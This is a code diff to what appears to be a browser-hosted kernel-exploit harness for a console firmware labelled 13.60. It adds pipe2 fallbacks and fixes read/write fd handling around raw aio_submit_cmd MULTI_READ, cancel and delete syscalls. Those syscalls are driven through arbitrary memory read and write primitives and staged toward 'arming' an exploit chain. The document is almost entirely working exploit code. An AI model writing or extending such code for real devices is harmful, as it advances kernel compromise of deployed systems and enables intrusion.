@@ -74,6 +74,7 @@
         12: "ENOMEM", 13: "EACCES", 14: "EFAULT", 16: "EBUSY", 17: "EEXIST",
         20: "ENOTDIR", 21: "EISDIR", 22: "EINVAL", 23: "ENFILE", 24: "EMFILE",
         25: "ENOTTY", 28: "ENOSPC", 30: "EROFS", 35: "EAGAIN", 38: "EINPROGRESS",
+        42: "ENOPROTOOPT", 43: "EPROTONOSUPPORT", 44: "ESOCKTNOSUPPORT",
         45: "EOPNOTSUPP", 48: "EADDRINUSE", 61: "ECONNREFUSED", 78: "ENOSYS",
     };
 
@@ -854,7 +855,16 @@
                     pairs.push([pr[0], pr[1]]);
                     out("T2c-socketpair", "pair#" + pi + " r=" + pr[0] + " w=" + pr[1], "ok");
                 } else {
-                    out("T2c-socketpair", "pair#" + pi + " refused: " + (spr.errName || hex(spr.ret)), "dim");
+                    var pfds = zeros(malloc(8), 8);
+                    var pp = S("pipe2 fallback#" + pi + " (socketpair refused " + (spr.errName || hex(spr.ret)) + ")", 0x2AF, [pfds, 0n]);
+                    if (pp.ret !== undefined && B(pp.ret) === 0n) {
+                        var pr2 = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
+                        pairs.push([pr2[0], pr2[1]]);
+                        out("T2c-socketpair", "pair#" + pi + " pipe2 fallback r=" + pr2[0] + " w=" + pr2[1], "warn");
+                    } else {
+                        out("T2c-socketpair", "pair#" + pi + " no live pair: socketpair=" + (spr.errName || hex(spr.ret))
+                            + " pipe2=" + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))), "dim");
+                    }
                 }
             }
             var kqr = S("kqueue", 0x16A, []);
@@ -1037,22 +1047,32 @@
             /* socketpair(AF_UNIX, SOCK_STREAM, 0, fds) -- syscall 0x35 on 13.60. The pair
              * is the live request source: nothing is written until the end, so every
              * MULTI_READ stays pending. */
-            var sfds = zeros(malloc(0x10), 0x10);
+            var sfds = zeros(malloc(0x10), 0x10), rfd = 0, wfd = 0;
             var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x035, [1n, 1n, 0n, sfds]);
-            if (sp.ret === undefined || B(sp.ret) !== 0n) {
-                out("T3b-VERDICT", "socketpair refused (" + (sp.errName || (sp.ret === undefined ? sp.threw : hex(sp.ret)))
-                    + ") -- no live request source; the chain's stage 0 starts here, so this needs settling first." + SAFETY, "warn");
-                return { ok: true, summary: "no socketpair" };
+            if (sp.ret !== undefined && B(sp.ret) === 0n) {
+                var sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
+                rfd = sfd[0]; wfd = sfd[1];
+                out("T3b-socketpair", "rfd=" + rfd + " wfd=" + wfd + " -- live pair; nothing written until the wake step", "dim");
+            } else {
+                var pfds = zeros(malloc(8), 8);
+                var pp = S("pipe2 (fallback; socketpair refused " + (sp.errName || hex(sp.ret)) + ")", 0x2AF, [pfds, 0n]);
+                if (!(pp.ret !== undefined && B(pp.ret) === 0n)) {
+                    out("T3b-VERDICT", "socketpair refused (" + (sp.errName || (sp.ret === undefined ? sp.threw : hex(sp.ret)))
+                        + ") and pipe2 refused (" + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret)))
+                        + ") -- no live request source; the chain's stage 0 starts here, so this needs settling first." + SAFETY, "warn");
+                    return { ok: true, summary: "no live source" };
+                }
+                var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
+                rfd = pr[0]; wfd = pr[1];
+                out("T3b-socketpair", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
             }
-            var sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
-            out("T3b-socketpair", "rfd=" + sfd[0] + " wfd=" + sfd[1] + " -- live pair; nothing written until the wake step", "dim");
 
             /* request structs: 0x28 bytes, read fd at +0x20 (PSAITO's MULTI_READ layout).
              * ids receives the request handles the kernel assigns at submit. */
             var NREQ = 2;
             var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
             for (var ri = 0; ri < NREQ; ri++) {
-                window.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), new Uint8Array([sfd[0] & 0xff, (sfd[0] >> 8) & 0xff, 0, 0, 0, 0, 0, 0]));
+                window.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), new Uint8Array([rfd & 0xff, (rfd >> 8) & 0xff, 0, 0, 0, 0, 0, 0]));
             }
             var ids = zeros(malloc(0x10), 0x10);
             var sub = S("aio_submit_cmd(MULTI_READ,n=2,prio=3)", 0x29D, [0x1001n, reqs, 2n, 3n, ids]);
@@ -1060,8 +1080,8 @@
                 out("T3b-VERDICT", "aio_submit_cmd refused (" + (sub.errName || (sub.ret === undefined ? sub.threw : hex(sub.ret)))
                     + ") -- the request layout (0x28, fd@+0x20) or the cmd/priority encoding is wrong; "
                     + "this is the stage the writeup never fully documents, and it is measurable without arming." + SAFETY, "warn");
-                S("close w", 0x006, [BigInt(sfd[0])]);
-                S("close r", 0x006, [BigInt(sfd[1])]);
+                S("close r", 0x006, [BigInt(rfd)]);
+                S("close w", 0x006, [BigInt(wfd)]);
                 return { ok: true, summary: "submit refused" };
             }
             var id0 = window.read64(ids), id1 = window.read64(ids + 8n);
@@ -1081,7 +1101,7 @@
              * sched_yield settle after: same kernel-worker timing argument as pArm. */
             var one = malloc(0x10);
             window.write_buffer(one, new Uint8Array([0x41]));
-            S("write(wfd,1)", 0x004, [BigInt(sfd[1]), one, 1n]);
+            S("write(wfd,1)", 0x004, [BigInt(wfd), one, 1n]);
             settle(100);
 
             /* Cleanup: cancel then delete with the SAME pointer, num=1, and a REAL states
@@ -1090,8 +1110,8 @@
             var stClean = zeros(malloc(0x20), 0x20);
             var c = S("aio_multi_cancel(ids,1,states)", 0x29A, [ids, 1n, stClean], true);
             var d = S("aio_multi_delete(ids,1,states)", 0x296, [ids, 1n, stClean], true);
-            S("close w", 0x006, [BigInt(sfd[1])]);   /* fd labels verified against T2's pipe2: sfd[0] is the read end */
-            S("close r", 0x006, [BigInt(sfd[0])]);
+            S("close r", 0x006, [BigInt(rfd)]);
+            S("close w", 0x006, [BigInt(wfd)]);
 
             out("T3b-VERDICT", "LIVE-REQUEST REACHABILITY MEASURED on " + FW + ": socketpair ok, submit ok (2 pending reads), "
                 + "multi_wait(num=1) answered " + (w.ret === undefined ? w.threw : hex(w.ret)) + (w.errName ? " (" + w.errName + ")" : "")
@@ -1521,17 +1541,17 @@
                 out("ARM-src", "socketpair rfd=" + rfd + " wfd=" + wfd, "ok");
             } else {
                 var pfds = zeros(malloc(8), 8);
-                var pp = S("pipe2 (fallback)", 0x2AF, [pfds, 0n]);
+                var pp = S("pipe2 (fallback; socketpair refused " + (sp.errName || hex(sp.ret)) + ")", 0x2AF, [pfds, 0n]);
                 if (!(pp.ret !== undefined && B(pp.ret) === 0n)) {
                     out("ARM-VERDICT", "no live-request source: socketpair refused ("
                         + (sp.errName || hex(sp.ret)) + ") and pipe2 refused ("
                         + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))) + ")", "err");
                     nres("no live-request source", "ARM");
                     return { ok: false, summary: "no source" };
+                }
                 var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
                 rfd = pr[0]; wfd = pr[1];
                 out("ARM-src", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
-            }
             }
 
             /* -- build the two 0x28 request structs with the READ fd at +0x20 -- */
